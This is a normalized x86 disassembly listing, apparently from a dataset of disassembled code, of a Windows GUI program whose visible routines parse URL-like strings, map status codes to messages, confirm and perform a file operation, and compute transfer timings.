push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x1a8
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ esp + 0x1a8 ]
mov [ fs : 0x0 ] ecx
add esp 0x1b4
retn
mov eax [ rw-data ]
push ebx
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp + 0xc ] edx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ rw-data ]
mov eax 0x2
cmp ecx eax
jge r-xdata
mov edi [ rw-data ]
mov esi [ rw-data ]
mov ecx rw-data
mov [ rw-data ] ebx
call sub_4010f0
mov edx esi
dec eax
sub edx edi
cmp edx eax
jne r-xdata
cmp [ rw-data ] ebx
mov esi [ rw-data ]
mov edi esi
je r-xdata
push 0x18
call sub_4b573e
add esp 0x4
mov [ esp + 0xc ] eax
cmp eax ebx
mov [ esp + 0x1bc ] 0x1
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] eax
jne r-xdata
push esi
push edi
mov ecx eax
call sub_4acfa0
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] bl
cmp [ rw-data ] ebx
push 0xffffffff
mov [ esp + 0x1c0 ] ebx
lea ecx [ esp + 0x14 ]
push ebx
jne r-xdata
mov esi [ rw-data ]
push rw-data
push rw-data
jmp r-xdata
push eax
call sub_457f40
add eax esi
push eax
lea eax [ esp + 0x54 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x10
push 0x4
push r--data
lea ecx [ esp + 0x54 ]
push ecx
push ebx
call [ MessageBoxA@IAT ]
cmp eax 0x6
jne r-xdata
lea esi [ esp + 0x14 ]
lea eax [ esp + 0x14 ]
call sub_401dd0
mov ecx [ esp + 0x28 ]
cmp ecx 0x10
mov eax [ esp + 0x14 ]
mov esi eax
jae r-xdata
lea ecx [ esp + 0x10 ]
call sub_4480e0
jmp r-xdata
cmp [ esp + 0x28 ] 0x10
mov eax [ esp + 0x14 ]
jae r-xdata
push eax
lea edx [ esp + 0x50 ]
push edx
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x4c ]
push eax
call [ lstrlenA@IAT ]
mov ecx [ rw-data ]
mov [ esp + eax + 0x4d ] bl
lea eax [ esp + 0x2c ]
lea edx [ esp + 0x4c ]
push eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] 0x3
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] 0x54
mov [ esp + 0x42 ] ebx
mov [ esp + 0x46 ] ebx
mov [ esp + 0x4a ] ebx
call [ SHFileOperationA@IAT ]
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
lea eax [ esp + 0x14 ]
mov eax [ rw-data ]
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebx
mov [ eax ] edx
jne r-xdata
mov ecx [ rw-data ]
push ebx
push ebx
push ebx
push ebx
push ebx
push ecx
mov [ rw-data ] ebx
call sub_466930
mov edx [ rw-data ]
add esp 0x18
push ebx
push ebx
push edx
call [ InvalidateRect@IAT ]
mov eax [ rw-data ]
push eax
call sub_466150
add esp 0x4
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebx
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_4ada00
push 0xffffffff
push sub_4c1f53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
mov [ esp + 0x8 ] esi
call sub_4ab480
xor eax eax
lea edi [ esi + 0x8 ]
mov [ esi ] r--data
mov [ esp + 0x14 ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
mov eax [ esp + 0x1c ]
push rw-data
mov ecx edi
mov [ esp + 0x18 ] 0x1
mov [ esi + 0x4 ] eax
call sub_46b640
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_4ac6d0
mov ecx [ esp + 0x14 ]
add esp 0x8
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_4ada80
push 0xffffffff
push sub_4c1f53
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
call sub_4ab480
xor ecx ecx
mov [ esi ] r--data
mov [ esp + 0x1c ] ecx
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] ecx
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] eax
mov edi [ rw-data ]
mov ebx eax
imul eax eax 0x70
mov [ esp + 0x1c ] 0x1
lea ebp [ eax + edi + 0x38 ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor ecx ecx
xor edx edx
jmp r-xdata
mov ecx esi
call sub_4ad0c0
mov ecx [ esp + 0x14 ]
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
cmp [ ebp ] 0xffffffff
jne r-xdata
cmp ebx edx
jge r-xdata
mov [ esi + 0x4 ] ebx
inc ebx
add ebp 0x70
jmp r-xdata
cmp edi ecx
jne r-xdata
sub_4adb80
push 0xffffffff
push sub_4c1f6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x18
call sub_4b573e
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov ecx [ rw-data ]
push ecx
mov ecx eax
call sub_4ada00
sub_4adc60
push 0xffffffff
push sub_4c1f6b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ rw-data ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
cmp [ eax ] 0x1
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esp ] edx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x18
call sub_4b573e
add esp 0x4
mov [ esp ] eax
test eax eax
mov [ esp + 0xc ] 0x0
je r-xdata
mov edx [ rw-data ]
push edx
mov ecx eax
call sub_4ada80
sub_4add10
sub esp 0x8
push ebx
mov ebx [ esp + 0x10 ]
mov al [ ebx ]
push esi
xor ecx ecx
xor esi esi
cmp al 0x2d
mov edx 0x1
push edi
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp al 0x2b
jne r-xdata
mov eax 0xffffffff
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
jmp r-xdata
mov al [ ebx ]
xor edi edi
cmp al 0x30
jl r-xdata
mov [ esp + 0xc ] edx
mov [ esp + 0x10 ] ecx
inc ebx
mov eax [ esp + 0x10 ]
push esi
push ecx
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_4b6490
pop edi
pop esi
pop ebx
add esp 0x8
retn
push ebp
pop ebp
movsx eax al
sub eax 0x30
push 0x0
cdq
push 0xa
mov ebp eax
push esi
mov eax edx
push ecx
mov [ esp + 0x2c ] eax
call sub_4b6490
add ebp eax
mov eax [ esp + 0x1c ]
adc eax edx
inc edi
cmp edi 0x10
mov ecx ebp
mov esi eax
jg r-xdata
xor ecx ecx
xor esi esi
mov al [ ebx + 0x1 ]
inc ebx
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
sub_4addb0
sub esp 0x108
push ebx
push ebp
mov ebp [ esp + 0x114 ]
push esi
mov esi eax
mov ebx 0x50
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp eax 0x7
jbe r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x108
retn
push 0x8
push esi
lea eax [ esp + 0x14 ]
push eax
call [ lstrcpynA@IAT ]
lea ecx [ esp + 0xc ]
push r--data
push ecx
call sub_4bdf8e
add esp 0x8
test eax eax
je r-xdata
mov al [ esi + 0x7 ]
add esi 0x7
xor ecx ecx
cmp al 0x2f
je r-xdata
mov [ ecx + edi ] 0x0
cmp [ esi ] 0x3a
jne r-xdata
jmp r-xdata
mov cl [ esi ]
xor eax eax
test cl cl
je r-xdata
mov al [ esi + 0x1 ]
inc esi
xor ecx ecx
cmp al 0x2f
je r-xdata
test al al
je r-xdata
mov [ ebp ] 0x2f
mov eax 0x1
cmp eax 0x1ff
jge r-xdata
lea edx [ esp + 0x14 ]
push edx
mov [ esp + ecx + 0x18 ] 0x0
call j_sub_4b692d
add esp 0x4
mov ebx eax
test al al
je r-xdata
cmp al 0x3a
je r-xdata
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
add esp 0x108
retn
inc esi
mov [ eax + ebp ] cl
mov cl [ esi ]
inc eax
test cl cl
jne r-xdata
cmp ecx 0xff
jge r-xdata
cmp ecx 0x1ff
jge r-xdata
test eax eax
jne r-xdata
inc esi
mov [ esp + ecx + 0x14 ] al
mov al [ esi ]
inc ecx
cmp al 0x2f
jne r-xdata
inc esi
mov [ ecx + edi ] al
mov al [ esi ]
inc ecx
cmp al 0x2f
jne r-xdata
pop esi
mov [ eax + ebp ] 0x0
pop ebp
mov eax ebx
pop ebx
add esp 0x108
retn
sub_4aded0
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov edx [ ebp ]
xor ebx ebx
cmp ecx edx
jge r-xdata
mov edx [ ebp ]
mov ecx [ eax ]
sub ebx edx
add ecx ebx
pop ebp
mov [ eax ] ecx
xor eax eax
pop ebx
retn
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x14 ]
mov ecx [ ebp ]
cmp eax ecx
jge r-xdata
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
sub ecx eax
mov eax [ esp + 0x1c ]
add ecx ebx
mov [ ebp ] ecx
mov [ eax ] 0x0
sub ecx eax
lea ecx [ ecx + ebx - 0x1 ]
mov [ ebp ] ecx
sub ecx ebx
push ecx
lea edx [ eax + edi + 0x1 ]
push edx
lea eax [ ebx + edi ]
push eax
call sub_4b5890
mov ecx [ esi ]
mov edx [ esp + 0x28 ]
mov [ edx ] ecx
add esp 0xc
mov [ esi ] 0x0
jmp r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x39
jg r-xdata
mov edx [ eax ]
mov ecx [ ebp ]
add ebx edx
xor dl dl
cmp ebx ecx
mov eax ebx
jge r-xdata
pop edi
pop esi
mov edx [ esp + 0x1c ]
mov ecx [ ebp ]
mov eax [ edx ]
sub ecx ebx
cmp eax ecx
mov eax edx
jl r-xdata
cmp cl 0x41
jl r-xdata
cmp cl 0x66
jg r-xdata
mov ecx [ esi ]
shl ecx 0x4
mov [ esi ] ecx
movsx ebp [ eax + edi ]
lea ecx [ ecx + ebp - 0x30 ]
mov ebp [ esp + 0x18 ]
mov dl 0x1
mov [ esi ] ecx
jmp r-xdata
cmp cl 0xa
jne r-xdata
cmp cl 0x46
jg r-xdata
mov ecx [ esi ]
shl ecx 0x4
mov [ esi ] ecx
movsx ebp [ eax + edi ]
lea ecx [ ecx + ebp - 0x57 ]
mov ebp [ esp + 0x18 ]
mov dl 0x1
mov [ esi ] ecx
jmp r-xdata
mov ecx [ ebp ]
inc eax
cmp eax ecx
jl r-xdata
test dl dl
jne r-xdata
mov ecx [ esi ]
shl ecx 0x4
mov [ esi ] ecx
movsx ebp [ eax + edi ]
lea ecx [ ecx + ebp - 0x37 ]
mov ebp [ esp + 0x18 ]
mov dl 0x1
mov [ esi ] ecx
jmp r-xdata
sub_4ae000
sub esp 0x100
push esi
push edi
mov edi [ esp + 0x10c ]
push edi
lea eax [ esp + 0xc ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x14 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ esp + 0x110 ]
sub eax edx
push eax
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_401cc0
cmp edi 0x274b
jg r-xdata
cmp edi 0x2af9
jg r-xdata
je r-xdata
sub edi 0x2afa
je r-xdata
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
lea eax [ edi - 0x2710 ]
cmp eax 0x3a
ja r-xdata
push r--data
mov ecx esi
call sub_402010
dec edi
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea eax [ edi - 0x274c ]
cmp eax 0x34
ja r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
pop edi
pop esi
add esp 0x100
retn
pop edi
pop esi
add esp 0x100
retn
movzx edx [ eax + lookup_table_4ae660 ]
jmp [ edx * 4 + jump_table_4ae5e4 ]
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
dec edi
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
pop edi
pop esi
add esp 0x100
retn
movzx eax [ eax + lookup_table_4ae708 ]
jmp [ eax * 4 + jump_table_4ae69c ]
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
sub_4ae740
mov ecx [ esp + 0x4 ]
sub esp 0x400
push 0x0
push 0x400
lea eax [ esp + 0x8 ]
push eax
push 0x0
push ecx
push 0x0
push 0x1000
call [ FormatMessageA@IAT ]
test eax eax
jbe r-xdata
add esp 0x400
retn
lea eax [ esp ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x408 ]
sub eax edx
push eax
lea edx [ esp + 0x4 ]
push edx
call sub_401cc0
sub_4ae7a0
sub esp 0x100
push esi
push edi
mov edi [ esp + 0x10c ]
push edi
lea eax [ esp + 0xc ]
push r--data
push eax
call [ wsprintfA@IAT ]
lea eax [ esp + 0x14 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov esi [ esp + 0x110 ]
sub eax edx
push eax
lea ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_401cc0
cmp edi 0x193
jg r-xdata
lea eax [ edi - 0x194 ]
cmp eax 0x65
ja r-xdata
je r-xdata
pop edi
pop esi
add esp 0x100
retn
movzx ecx [ eax + lookup_table_4aedb4 ]
jmp [ ecx * 4 + jump_table_4aed60 ]
mov eax r--data
lea edx [ eax + 0x1 ]
cmp edi 0x12d
jg r-xdata
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
pop edi
pop esi
add esp 0x100
retn
lea eax [ edi - 0x12e ]
cmp eax 0x64
ja r-xdata
je r-xdata
movzx eax [ eax + lookup_table_4aecf8 ]
jmp [ eax * 4 + jump_table_4aecd0 ]
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
lea eax [ edi - 0x64 ]
cmp eax 0xc8
ja r-xdata
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
movzx edx [ eax + lookup_table_4aec04 ]
jmp [ edx * 4 + jump_table_4aebd8 ]
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
push r--data
mov ecx esi
call sub_402010
pop edi
pop esi
add esp 0x100
retn
sub_4aee20
sub esp 0x31c
push ebx
push ebp
push esi
mov esi [ esp + 0x32c ]
mov eax [ esi + 0xa4 ]
mov ecx [ esi + 0x28 ]
mov edx [ esi + 0xa8 ]
push edi
mov edi [ esp + 0x338 ]
test edi edi
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] ecx
mov [ esp + 0x20 ] edx
je r-xdata
call [ GetTickCount@IAT ]
mov edi [ esi + 0xa0 ]
mov ecx eax
mov [ esp + 0x10 ] eax
sub ecx edi
mov eax 0x10624dd3
mul ecx
mov eax edx
shr eax 0x6
xor edx edx
mov edi 0x3c
div edi
mov ebx [ wsprintfA@IAT ]
mov eax 0x45e7b273
push edx
mul ecx
shr edx 0xe
push edx
lea eax [ esp + 0x234 ]
push r--data
push eax
call ebx
lea eax [ esp + 0x23c ]
add esp 0x10
lea edx [ eax + 0x1 ]
mov edi edi
mov ebx [ esi + 0x30 ]
mov ebp [ esi + 0x34 ]
mov eax ebx
or eax ebp
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ esp + 0x334 ]
sub eax edx
push eax
lea ecx [ esp + 0x230 ]
push ecx
mov ecx edi
call sub_401cc0
mov edx [ esi + 0x38 ]
or edx [ esi + 0x3c ]
jne r-xdata
mov ecx [ esi + 0x4c ]
mov edx [ esi + 0x48 ]
push 0x0
push 0x64
push ecx
push edx
call sub_4b6490
push ebp
push ebx
push edx
push eax
call sub_4b61c0
mov [ edi ] eax
mov [ edi ] 0x0
jmp r-xdata
mov eax [ esi + 0x38 ]
push eax
lea ecx [ esp + 0x130 ]
push r--data
push ecx
call ebx
add esp 0xc
mov [ esp + 0x12c ] 0x0
jmp r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0x8
je r-xdata
mov eax [ esi + 0x48 ]
push eax
lea ecx [ esp + 0x30 ]
push r--data
push ecx
call ebx
add esp 0xc
jmp r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x34 ]
mov edx ebp
or edx eax
jne r-xdata
mov edi [ esp + 0x10 ]
sub edi [ esi + 0x54 ]
cmp edi 0x1f4
jbe r-xdata
cmp eax 0xe
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0xf
ja r-xdata
mov eax [ esp + 0x10 ]
sub eax [ esi + 0x50 ]
mov [ esp + 0x14 ] eax
jne r-xdata
mov ebx [ esi + 0x48 ]
mov edx [ esi + 0x58 ]
mov ebp [ esi + 0x4c ]
mov eax [ esi + 0x5c ]
mov ecx ebx
sub ecx edx
push 0x0
mov edx ebp
push 0xa
sbb edx eax
push edx
push ecx
call sub_4b6490
push 0x0
push edi
push edx
push eax
call sub_4b61c0
mov [ esi + 0xf8 ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x54 ] eax
mov [ esi + 0x58 ] ebx
mov [ esi + 0x5c ] ebp
cmp eax 0xf
je r-xdata
mov ebx [ esp + 0x24 ]
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_4af2e4 ]
mov eax [ esi + 0xf8 ]
cdq
mov ecx 0xa
idiv ecx
mov ebx [ esi + 0x4c ]
mov edi [ esi + 0x48 ]
xor ebp ebp
push ebp
push ecx
push ebx
push edi
mov [ esp + 0x38 ] edx
mov [ esp + 0x2c ] eax
call sub_4b6490
mov ecx [ esp + 0x14 ]
push ebp
push ecx
push edx
push eax
call sub_4b61c0
push ebp
push 0xa
push edx
push eax
call sub_4b6a30
mov edx [ esp + 0x14 ]
push eax
push ebp
push edx
push ebx
push edi
call sub_4b61c0
mov ecx [ esp + 0x20 ]
mov edx [ esi + 0x30 ]
push eax
mov eax [ esp + 0x30 ]
push eax
push ecx
push edx
mov eax edi
push eax
push ebp
push 0x64
push ebx
push edi
call sub_4b6490
mov ecx [ esi + 0x34 ]
push ecx
mov ecx [ esi + 0x30 ]
push ecx
push edx
push eax
call sub_4b61c0
push eax
lea ecx [ esp + 0x48 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
mov eax [ esp + 0x34 ]
mov edi [ esi + 0x54 ]
mov ebx [ wsprintfA@IAT ]
mov edx eax
sub edx edi
mov edi [ esp + 0x358 ]
add esp 0x24
cmp edx 0x7d0
jbe r-xdata
mov [ esp + 0x14 ] 0x1
mov edx [ esi + 0x30 ]
mov eax [ esi + 0x48 ]
mov ecx [ esi + 0x4c ]
push edx
push eax
push 0x0
push 0x64
push ecx
mov edx eax
push edx
call sub_4b6490
mov ecx [ esi + 0x34 ]
push ecx
push ebp
push edx
push eax
call sub_4b61c0
push eax
lea eax [ esp + 0x38 ]
push r--data
push eax
call ebx
add esp 0x14
jmp r-xdata
jle r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
nop
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
